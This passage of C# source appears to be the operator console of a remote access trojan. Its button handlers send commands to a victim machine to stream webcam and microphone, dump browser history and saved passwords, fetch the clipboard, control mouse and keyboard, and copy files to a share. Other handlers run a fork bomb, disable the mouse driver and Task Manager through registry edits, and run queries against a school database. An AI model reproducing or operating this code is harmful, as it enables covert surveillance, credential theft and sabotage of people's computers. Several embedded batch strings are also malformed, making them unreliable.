            if (rs == DialogResult.OK)
            {
                StreamWriter wrt = new StreamWriter(saveFileDialog1.FileName);
                wrt.Write(textBox5.Text);
                wrt.Close();
                MessageBox.Show("Log file has been Saved!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void trackBar2_Scroll(object sender, EventArgs e)
        {
            label8.Text = "Image Quality (" + trackBar2.Value + "%)";
            SendMessage(new global::DataObject
            {
                CommandType = "Webcam",
                CommandName = "depth",
                CommandData = trackBar2.Value
            });
        }

        private void button20_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Mic",
                CommandName = "List"
            });
        }

        private void button22_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Mic",
                CommandName = "choose",
                CommandData = comboBox3.SelectedIndex
            });
        }

        bool mic = false;
        private void button23_Click(object sender, EventArgs e)
        {
            if (!mic)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Mic",
                    CommandName = "Start"
                });
                mic = true;
                button23.Text = "Stop Stream";
                waveout.Play();
            }
            else
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Mic",
                    CommandName = "Stop"
                });
                mic = false;
                waveout.Stop();
                button23.Text = "Start Stream";
            }
        }

        private void button24_Click(object sender, EventArgs e)
        {
            string browser = null;
            if (comboBox4.SelectedItem.ToString().ToLower().Contains("firefox"))
                browser = "fhistory";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("chrome"))
                browser = "chistory";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("torch"))
                browser = "thistory";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("expl"))
                browser = "ihistory";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("opera"))
                browser = "ohistory";

            SendMessage(new global::DataObject
            {
                CommandType = "Browsers",
                CommandName = browser
            });
        }

        private void button27_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Self",
                CommandName = "Init"
            });
        }

        private void button26_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Self",
                CommandName = "status"
            });
        }

        private void button25_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Self",
                CommandName = "restart",
                CommandData = checkBox1.Checked
            });
        }

        private void button28_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Self",
                CommandName = "destroy",
                CommandData = checkBox2.Checked
            });
        }

        private void button31_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Browsers",
                CommandName = "list"
            });
        }

        private void AddtoDevice(object obj)
        {
            try
            {
                addDeviceStatus(obj);
                MessageBox.Show("Device Change has been detected consult device log!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch
            {
                MessageBox.Show("Device change Notification problem!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void AddtoClipBoard(object obj)
        {
            try
            {
                ArrayList theData = (ArrayList)obj;
                System.Windows.Forms.DataObject dataObj = new System.Windows.Forms.DataObject();
                for (int i = 0; i < theData.Count; i++)
                {
                    string format = (string)theData[i++];
                    dataObj.SetData(format, theData[i]);
                }

                if (checkBox4.Checked)
                    Clipboard.SetDataObject(dataObj, true);

                SenseCommonData(dataObj);
                MessageBox.Show("Clipboard updated!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch
            {
                MessageBox.Show("Clipboard cannot be Altered!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void SenseCommonData(System.Windows.Forms.DataObject lst)
        {
            string typ = "Unknown";
            string action = "Unknown";
            object ob = null;

            if (lst.ContainsAudio())
            {
                typ = "Audio";
                action = "Play";
                ob = lst.GetAudioStream();
            }
            else if(lst.ContainsImage())
            {
                typ = "Image";
                action = "View";
                ob = lst.GetImage();
            }
            else if (lst.ContainsText())
            {
                typ = "Text";
                action = "View";
                ob = lst.GetText();
            }
            else
            {
                foreach (string format in lst.GetFormats())
                {
                    if (lst.GetDataPresent(format))
                    {
                        typ = format;
                        action = "Sync";
                        ob = lst.GetData(format);
                        break;
                    }
                }
            }

            

            object[] items = new object[4];
            items[0] = (dataGridView2.Rows.Count + 1).ToString();
            items[1] = typ;
            items[2] = DateTime.Now.ToShortTimeString();
            items[3] = action;

            clipboard.Add(ob);
            dataGridView2.Rows.Add(items);
        }

        private void button30_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Browsers",
                CommandName = "fclear"
            });
        }

        private void button34_Click(object sender, EventArgs e)
        {
            dataGridView2.Rows.Clear();
            clipboard.Clear();
        }

        private void button32_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Clipboard",
                CommandName = "clear"
            });
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Clipboard",
                CommandName = "state",
                CommandData = checkBox3.Checked
            });
        }

        private void dataGridView2_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            if (dataGridView2.Columns[e.ColumnIndex] is DataGridViewButtonColumn && e.RowIndex >= 0)
            {
                Decode(dataGridView2.Rows[e.RowIndex].Cells[1].Value.ToString(), e.RowIndex);
            }
        }

        private void Decode(string p1, int p2)
        {
            if (p1 == "Text")
                MessageBox.Show((string)clipboard[p2], "Clipboard", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else if (p1 == "Audio")
            {
                Stream st = (Stream)clipboard[p2];
                SoundPlayer player = new SoundPlayer(st);
                player.Play();
            }
            else if (p1 == "Image")
            {
                Image im = (Image)clipboard[p2];
                ViewImage vi = new ViewImage(im);
                vi.Show();
            }
            else
                Clipboard.SetDataObject(clipboard[p2]);
        }

        private void button35_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Clipboard",
                CommandName = "fetch"
            });
        }

        private void menuItem1_Click(object sender, EventArgs e)
        {
            TaskManager();
        }

        private void resetToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GetTreeViewDirectory();
        }

        private void downloadCMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            txtMessage.Text = GenCommand();
        }

        private string GenCommand()
        {
            string path = treeView1.SelectedNode.Tag.ToString() + "\\" + lstClientFiles.SelectedItems[0].Text;
            path = "XCOPY \""+path + "\" \\\\ZED\\Network";
            return path;
        }

        private void button36_Click(object sender, EventArgs e)
        {
            dataGridView3.Rows.Clear();
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Device",
                CommandName = "notify",
                CommandData = checkBox6.Checked
            });
        }

        public void Alert()
        {
            System.Media.SystemSounds.Beep.Play();
        }

        public void Error()
        {
            System.Media.SystemSounds.Exclamation.Play();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            pictureBox1.BackgroundImage.Save(Environment.CurrentDirectory + "\\Screenshots\\" + DateTime.Now.ToString("yyyyMMddHHmmssfff") + ".jpg");
        }

        private void button29_Click(object sender, EventArgs e)
        {
            if (button29.Text.Contains("Stop"))
            {
                button29.Text = "Start Recording";
                Application.DoEvents();
                moviemaker = new MovieMaker();
                moviemaker.CreateMovie(images);
                images.Clear();
                images = null;
                moviemaker = null;
                MessageBox.Show("Vedio has been saved Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                images = new List<Bitmap>();
                button29.Text = "Stop Recording";
            }
        }

        private void button33_Click(object sender, EventArgs e)
        {

        }

        private void saveFileDialog1_FileOk(object sender, System.ComponentModel.CancelEventArgs e)
        {
            //Need to do hard work here lolz
        }

        private void button38_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != null && textBox1.Text != "")
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Browsers",
                    CommandName = comboBox4.SelectedItem.ToString(),
                    CommandData = textBox1.Text
                });
            }
        }

        private void timer_ping_Tick(object sender, EventArgs e)
        {
            timer_ping.Stop();
            refreshPing();
            timer_ping.Start();
        }

        private void updateGauges(float upd, float down)
        {
            Text = "Upload : "+upd + " & Download : " + down;

            if (upd > gaugeUpload.MaxValue)
                upd = gaugeUpload.MaxValue;

            if (down > gaugeDownload.MaxValue)
                down = gaugeDownload.MaxValue;

            gaugeUpload.Value = upd;
            gaugeDownload.Value = down;
        }

        internal void updateNetworkStats(float p1, float p2)
        {
            if (IsHandleCreated)
                Invoke(new Action(() => updateGauges(p1, p2)));
        }

        private void button40_Click(object sender, EventArgs e)
        {
            string browser = null;
            if (comboBox4.SelectedItem.ToString().ToLower().Contains("firefox"))
                browser = "fpass";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("chrome"))
                browser = "cpass";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("torch"))
                browser = "cpass";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("expl"))
                browser = "ipass";
            else if (comboBox4.SelectedItem.ToString().ToLower().Contains("opera"))
                browser = "opass";

            SendMessage(new global::DataObject
            {
                CommandType = "Browsers",
                CommandName = browser
            });
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if(checkBox7.Checked && !button7.Enabled)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Mouse",
                    CommandName = "false",
                    CommandData = new object[] { e.Location, new Size(pictureBox1.Width, pictureBox1.Height) }
                });
            }
        }

        private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {
            if (checkBox7.Checked && !button7.Enabled)
            {
                if (e.Button == MouseButtons.Left)
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "Mouse",
                        CommandName = "true",
                        CommandData = "ldown"
                    });
                    SendMessage(new global::DataObject
                    {
                        CommandType = "Mouse",
                        CommandName = "true",
                        CommandData = "lup"
                    });
                }
                else if (e.Button == MouseButtons.Right)
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "Mouse",
                        CommandName = "true",
                        CommandData = "rdown"
                    });
                    SendMessage(new global::DataObject
                    {
                        CommandType = "Mouse",
                        CommandName = "true",
                        CommandData = "rup"
                    });
                }
            }
        }

        private void Controller_KeyDown(object sender, KeyPressEventArgs e)
        {
            if (checkBox5.Checked && !button7.Enabled)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Keyboard",
                    CommandName = "send",
                    CommandData = e.KeyChar.ToString()
                });
            }
        }

        private void button41_Click(object sender, EventArgs e)
        {
            issueCommand("shutdown -s -f -t 10");
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button42_Click(object sender, EventArgs e)
        {
            issueCommand("shutdown -r -f -t 10");
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button44_Click(object sender, EventArgs e)
        {
            issueCommand("rundll32.exe user32.dll,LockWorkStation");
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button43_Click(object sender, EventArgs e)
        {
            issueCommand("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button50_Click(object sender, EventArgs e)
        {
            issueCommand("%0|%0");
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button45_Click(object sender, EventArgs e)
        {
            if(button45.Text.Contains("Lock"))
            {
                string command = "@echo off" +
                "set key=\\\"HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass\\\"" +
                "set key=\"HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass\\\"" +
                "reg delete %key%" +
                "reg delete %key%" +
                "reg add %key% /v Start /t REG_DWORD /d 4" +
                "reg add %key% /v Start /t REG_DWORD /d 4";

                issueCommand(command);
                button45.Text = "Unlock Mouse";
            }
            else
            {
                string command = "@echo off" +
                "set key=\"HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass\\\"" +
                "set key=\"HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass\\\"" +
                "reg add %key% /v Start /t REG_DWORD /d 1";

                issueCommand(command);
                button45.Text = "Lock  Mouse";
            }
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button48_Click(object sender, EventArgs e)
        {
            if (button48.Text.Contains("Lock"))
            {
                issueCommand("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul");
                button48.Text = "Unlock Taskmgr";
            }
            else
            {
                issueCommand("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableTaskMgr /t REG_SZ /d 1 /f >nul");
                button48.Text = "Lock Taskmgr";
            }
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button53_Click(object sender, EventArgs e)
        {
            string com = "echo Do >> “opendisk.vbs”" +
            "echo Set oWMP = CreateObject(“WMPlayer.OCX.7” ) >> “opendisk.vbs”" +
            "echo Set colCDROMs = oWMP.cdromCollection >> “opendisk.vbs”" +
            "echo colCDROMs.Item(d).Eject >> “opendisk.vbs”" +
            "echo colCDROMs.Item(d).Eject >> “opendisk.vbs”" +
            "echo Loop >> “opendisk.vbs”" +
            "start “” “opendisk.vbs”";
            issueCommand("Del opendisk.vbs");
            issueCommand(com);
            MessageBox.Show("Command has been sent Successfully!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void textBox7_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && e.Shift != true)
            {
                if (textBox7.Text != null && textBox7.Text != "")
                {
                    redirect = true;
                    string sql = "\"sqlcmd -Q \"" + textBox7.Text + "\" -d MTB_SchoolSystem\"";
                    sql = sql.Replace("\r\n", " ");
                    textBox7.Text = null;
                    issueCommand(sql);
                }
            }
        }
    }
}